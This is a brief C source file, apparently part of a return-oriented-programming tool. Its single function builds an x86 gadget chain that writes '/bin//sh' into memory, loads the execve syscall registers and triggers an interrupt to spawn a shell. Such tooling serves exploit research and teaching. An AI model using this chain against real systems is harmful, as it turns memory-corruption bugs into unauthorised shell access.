#include "spec.h"

int rop_chain_execve(struct Node *root, struct Gadget *head, struct Arg *arg)
{
    struct API *api;
    unsigned int data = 0x080efff0;
    rop_build_api(root, &api, arg);

    printf("\n--- Start chain *execve(\"/bin/sh\")* gadgets ---\n\n");
    rop_chain_list_init(head);

    rop_write_memory_gadget(head, api, data, 0x6e69622f);
    rop_write_memory_gadget(head, api, data + 4, 0x68732f2f);
    rop_write_memory_gadget(head, api, data + 8, 0);

    rop_write_register_gadget(api, "ebx", data);
    rop_write_register_gadget(api, "ecx", data + 8);
    rop_write_register_gadget(api, "edx", data + 8);
    rop_chain_write_register_gadget(head, api);

    rop_zero_register_gadget(head, api, "eax");
    rop_add_register_gadget(head, api, "eax", 11); 
    rop_interrupt_gadget(head, api);

    rop_end_api(api);
    return 0;
}

